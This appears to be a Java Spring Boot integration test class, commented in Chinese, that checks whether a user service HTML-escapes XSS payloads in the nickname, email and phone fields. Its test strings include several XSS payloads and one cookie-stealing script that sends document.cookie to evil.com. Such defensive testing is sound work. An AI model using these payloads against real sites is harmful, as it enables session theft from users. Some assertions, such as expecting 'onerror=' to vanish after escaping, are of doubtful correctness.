package com.adminplus.integration;

import com.adminplus.pojo.dto.req.UserCreateReq;
import com.adminplus.pojo.dto.req.UserUpdateReq;
import com.adminplus.pojo.dto.resp.UserResp;
import com.adminplus.pojo.entity.UserEntity;
import com.adminplus.repository.UserRepository;
import com.adminplus.service.UserService;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.transaction.annotation.Transactional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.*;

/**
 * UserService XSS 防护集成测试
 * <p>
 * 真实测试：接收包含 XSS payload 的请求 → 验证数据被转义后存入数据库
 * <p>
 * 这不是 mock 测试，而是真实的业务流程测试
 *
 * @author AdminPlus
 * @since 2026-04-05
 */
@SpringBootTest
@ActiveProfiles("test")
@Transactional
@Disabled("Integration tests require Docker with Testcontainers")
@DisplayName("UserService XSS 防护集成测试")
class UserServiceXssIntegrationTest {

    @Autowired
    private UserService userService;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    private UserEntity testUser;

    @BeforeEach
    void setUp() {
        // 创建一个测试用户作为基础数据
        testUser = new UserEntity();
        testUser.setUsername("testuser_xss");
        testUser.setPassword(passwordEncoder.encode("Password123!"));
        testUser.setNickname("Test User");
        testUser.setEmail("test@example.com");
        testUser.setPhone("13800138000");
        testUser.setStatus(1);
        testUser = userRepository.save(testUser);
    }

    @AfterEach
    void tearDown() {
        // 清理测试数据
        userRepository.deleteAll();
    }

    @Nested
    @DisplayName("创建用户时的 XSS 防护")
    class CreateUserXssTests {

        @Test
        @DisplayName("创建用户时 nickname 包含 script 标签应被转义")
        void shouldEscapeScriptTagInNicknameWhenCreateUser() {
            // Given - nickname 包含 XSS payload
            String xssNickname = "<script>alert('xss')</script>Admin";
            UserCreateReq req = new UserCreateReq(
                    "xssuser01",
                    "Password123!",
                    xssNickname,  // XSS payload
                    "xss@test.com",
                    "13800138001",
                    null,
                    null
            );

            // When - 创建用户
            UserResp result = userService.createUser(req);

            // Then - 从数据库读取验证
            UserEntity savedUser = userRepository.findById(result.id())
                    .orElseThrow(() -> new AssertionError("用户未保存"));

            // 验证 script 标签被转义
            assertThat(savedUser.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("</script>");
            // 验证包含转义后的字符
            assertThat(savedUser.getNickname())
                    .contains("&lt;script&gt;");

            // 额外验证：返回的响应也被转义
            assertThat(result.nickname())
                    .doesNotContain("<script>")
                    .contains("&lt;");
        }

        @Test
        @DisplayName("创建用户时 email 包含 XSS payload 应被转义")
        void shouldEscapeXssInEmailWhenCreateUser() {
            // Given - email 包含 XSS
            String xssEmail = "<img src=x onerror=alert(1)@test.com>";
            UserCreateReq req = new UserCreateReq(
                    "xssuser02",
                    "Password123!",
                    "Test User",
                    xssEmail,
                    "13800138002",
                    null,
                    null
            );

            // When
            UserResp result = userService.createUser(req);

            // Then
            UserEntity savedUser = userRepository.findById(result.id())
                    .orElseThrow();

            // 验证 img 标签被转义
            assertThat(savedUser.getEmail())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
        }

        @Test
        @DisplayName("创建用户时 phone 包含 HTML 注入应被转义")
        void shouldEscapeHtmlInPhoneWhenCreateUser() {
            // Given
            String xssPhone = "<>&\"'13800138003";
            UserCreateReq req = new UserCreateReq(
                    "xssuser03",
                    "Password123!",
                    "Test",
                    "test@test.com",
                    xssPhone,
                    null,
                    null
            );

            // When
            UserResp result = userService.createUser(req);

            // Then
            UserEntity savedUser = userRepository.findById(result.id())
                    .orElseThrow();

            // 验证 HTML 特殊字符被转义
            assertThat(savedUser.getPhone())
                    .doesNotContain("<")
                    .doesNotContain(">")
                    .doesNotContain("\"");
        }

        @Test
        @DisplayName("创建用户时多个字段同时包含 XSS 应全部被转义")
        void shouldEscapeXssInAllFieldsWhenCreateUser() {
            // Given - 所有字段都包含 XSS
            UserCreateReq req = new UserCreateReq(
                    "xssuser04",
                    "Password123!",
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>@test.com",
                    "<>\"'13800138004",
                    null,
                    null
            );

            // When
            UserResp result = userService.createUser(req);

            // Then
            UserEntity savedUser = userRepository.findById(result.id())
                    .orElseThrow();

            // 验证所有字段都被转义
            assertThat(savedUser.getNickname()).doesNotContain("<script>");
            assertThat(savedUser.getEmail()).doesNotContain("<img");
            assertThat(savedUser.getPhone()).doesNotContain("<>");
        }
    }

    @Nested
    @DisplayName("更新用户时的 XSS 防护")
    class UpdateUserXssTests {

        @Test
        @DisplayName("更新用户 nickname 时应转义 XSS")
        void shouldEscapeXssWhenUpdateNickname() {
            // Given
            String xssNickname = "<iframe src=javascript:alert(1)></iframe>XSS";
            UserUpdateReq req = new UserUpdateReq(
                    xssNickname,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            // When
            UserResp result = userService.updateUser(testUser.getId(), req);

            // Then - 从数据库读取验证
            UserEntity updatedUser = userRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证 iframe 标签被转义
            assertThat(updatedUser.getNickname())
                    .doesNotContain("<iframe>")
                    .doesNotContain("</iframe>");
            // 验证返回值也被转义
            assertThat(result.nickname())
                    .doesNotContain("<iframe>");
        }

        @Test
        @DisplayName("更新用户 email 时应转义 XSS")
        void shouldEscapeXssWhenUpdateEmail() {
            // Given
            String xssEmail = "<body onload=alert(1)>@test.com";
            UserUpdateReq req = new UserUpdateReq(
                    null,
                    xssEmail,
                    null,
                    null,
                    null,
                    null
            );

            // When
            userService.updateUser(testUser.getId(), req);

            // Then
            UserEntity updatedUser = userRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证 onload 事件被破坏
            assertThat(updatedUser.getEmail())
                    .doesNotContain("onload=");
        }

        @Test
        @DisplayName("更新用户 phone 时应转义 HTML 字符")
        void shouldEscapeHtmlWhenUpdatePhone() {
            // Given
            String xssPhone = "<script>'\"&Phone";
            UserUpdateReq req = new UserUpdateReq(
                    null,
                    null,
                    xssPhone,
                    null,
                    null,
                    null
            );

            // When
            userService.updateUser(testUser.getId(), req);

            // Then
            UserEntity updatedUser = userRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证 HTML 字符被转义
            assertThat(updatedUser.getPhone())
                    .doesNotContain("<script>")
                    .doesNotContain("\"");
        }
    }

    @Nested
    @DisplayName("数据库持久化验证")
    class DatabasePersistenceTests {

        @Test
        @DisplayName("验证转义后的数据正确存入数据库")
        void shouldVerifyEscapedDataPersistedCorrectly() {
            // Given
            String xssNickname = "<div onclick=\"alert('xss')\">Click</div>";
            UserUpdateReq req = new UserUpdateReq(
                    xssNickname,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            // When
            userService.updateUser(testUser.getId(), req);

            // Then - 刷新数据库读取
            userRepository.flush();
            UserEntity persistedUser = userRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证数据库中的值确实被转义了
            String persistedNickname = persistedUser.getNickname();
            assertThat(persistedNickname)
                    .isNotNull()
                    .doesNotContain("<div>")
                    .doesNotContain("onclick=");

            // 验证可以通过 findById 读取到转义后的值
            UserResp fromService = userService.getUserById(testUser.getId());
            assertThat(fromService.nickname())
                    .isEqualTo(persistedNickname);
        }

        @Test
        @DisplayName("验证多次更新时每次都进行转义")
        void shouldEscapeOnMultipleUpdates() {
            // Given - 第一次更新
            String xss1 = "<script>first</script>";
            userService.updateUser(testUser.getId(), new UserUpdateReq(
                    xss1, null, null, null, null, null
            ));

            // When - 第二次更新（再次包含 XSS）
            String xss2 = "<img src=x onerror=alert(1)>";
            userService.updateUser(testUser.getId(), new UserUpdateReq(
                    xss2, null, null, null, null, null
            ));

            // Then
            UserEntity finalUser = userRepository.findById(testUser.getId())
                    .orElseThrow();

            // 第二次更新的值也被转义
            assertThat(finalUser.getNickname())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
        }
    }

    @Nested
    @DisplayName("边界条件测试")
    class EdgeCaseTests {

        @Test
        @DisplayName("null 值应正常处理")
        void shouldHandleNullValues() {
            // Given
            UserUpdateReq req = new UserUpdateReq(
                    null,  // nickname 为 null
                    null,
                    null,
                    null,
                    null,
                    null
            );

            // When - 不应该抛出异常
            UserResp result = userService.updateUser(testUser.getId(), req);

            // Then
            assertThat(result).isNotNull();
            UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname()).isEqualTo("Test User"); // 保持原值
        }

        @Test
        @DisplayName("空字符串应正常处理")
        void shouldHandleEmptyString() {
            // Given
            UserUpdateReq req = new UserUpdateReq(
                    "",  // 空字符串
                    "",
                    "",
                    null,
                    null,
                    null
            );

            // When
            UserResp result = userService.updateUser(testUser.getId(), req);

            // Then
            assertThat(result).isNotNull();
            UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname()).isEqualTo("");
            assertThat(user.getEmail()).isEqualTo("");
        }

        @Test
        @DisplayName("只包含 XSS 标签的字符串应被正确转义")
        void shouldHandleOnlyXssTags() {
            // Given
            String onlyXss = "<script><img src=x onerror=alert(1)></script>";
            UserUpdateReq req = new UserUpdateReq(
                    onlyXss,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            // When
            UserResp result = userService.updateUser(testUser.getId(), req);

            // Then
            UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("<img");
        }
    }

    @Nested
    @DisplayName("真实 XSS 攻击场景模拟")
    class RealWorldXssAttackTests {

        @Test
        @DisplayName("模拟存储型 XSS 攻击：用户资料中注入恶意脚本")
        void shouldSimulateStoredXssAttack() {
            // Given - 攻击者尝试在 nickname 中注入存储型 XSS
            String storedXssPayload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
            UserUpdateReq req = new UserUpdateReq(
                    storedXssPayload,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            // When - 更新用户资料
            UserResp result = userService.updateUser(testUser.getId(), req);

            // Then - 验证攻击被防御
            UserEntity user = userRepository.findById(testUser.getId()).orElseThrow();

            // 数据库中存储的是转义后的内容
            assertThat(user.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("fetch(")
                    .doesNotContain("document.cookie");

            // 返回给前端的也是转义后的内容
            assertThat(result.nickname())
                    .doesNotContain("<script>")
                    .contains("&lt;");

            // 验证即使前端渲染这个值，也不会执行脚本
            String renderedNickname = result.nickname();
            assertFalse(renderedNickname.contains("<script>"),
                    "前端渲染时不应包含可执行的 script 标签");
        }

        @Test
        @DisplayName("模拟反射型 XSS：用户输入包含恶意 HTML")
        void shouldSimulateReflectedXssAttack() {
            // Given - 模拟用户通过表单提交包含反射型 XSS 的数据
            String reflectedXss = "<img src=x onerror=\"alert('XSS')\">";
            UserCreateReq req = new UserCreateReq(
                    "xssuser05",
                    "Password123!",
                    reflectedXss,
                    "test@test.com",
                    "13800138005",
                    null,
                    null
            );

            // When
            UserResp result = userService.createUser(req);

            // Then - 验证响应中不包含可执行的 XSS
            assertThat(result.nickname())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");

            // 验证数据库中也存储了转义后的值
            UserEntity user = userRepository.findById(result.id()).orElseThrow();
            assertThat(user.getNickname())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
        }
    }
}
